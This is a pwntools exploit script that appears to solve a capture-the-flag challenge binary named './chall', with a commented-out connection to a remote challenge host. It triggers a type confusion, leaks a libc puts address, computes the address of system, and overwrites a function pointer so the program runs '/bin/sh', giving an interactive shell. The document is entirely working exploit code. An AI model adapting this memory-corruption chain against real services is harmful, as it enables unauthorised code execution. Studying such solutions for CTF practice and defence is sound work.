from os import system
from pwn import *

# pc = process('./chall')
# pc = connect("13.231.219.122", 9014)
pc = process("./chall")

pc.sendlineafter(b": ", b"/bin/sh")
pc.sendlineafter(b": ", b"5000")
pc.sendlineafter(b": ", b"5000")
log.info("Register Done")
# Type Confusion GE -> Major
pc.sendlineafter(b">", b"1")
pc.sendlineafter(b">", b"0")
pc.sendlineafter(b">", b"2")
pc.sendlineafter(b">", b"0")
log.info("Type confusion")
# pc.interactive()

# Leak Libc Address
pc.sendlineafter(b">", b"4")
pc.sendlineafter(b">", b"WED 4")
pc.sendline(p64(0x405020))
pc.sendlineafter(b">", b"2")
pc.recvuntil(b" - ")
puts_libc = pc.recvuntil(b"\n")
print(puts_libc)
puts_libc = puts_libc[:-1]
puts_libc = u64(puts_libc.ljust(8, b"\x00"))
log.info("puts_libc: " + hex(puts_libc))
system_libc = puts_libc - 0x30170
log.info("system_libc: " + hex(system_libc))
pc.sendlineafter(b">", b"1")

# OverWrite function pointer to system
pc.sendlineafter(b">", b"4")
payload = p64(0) + p64(system_libc)
pc.sendlineafter(b">", b"WED 4")
pc.sendline(payload)
# gdb.attach(pc)
# pc.interactive()

pc.sendlineafter(b">", b"2")
pc.sendlineafter(b">", b"0")

# gdb.attach(pc)

pc.interactive()
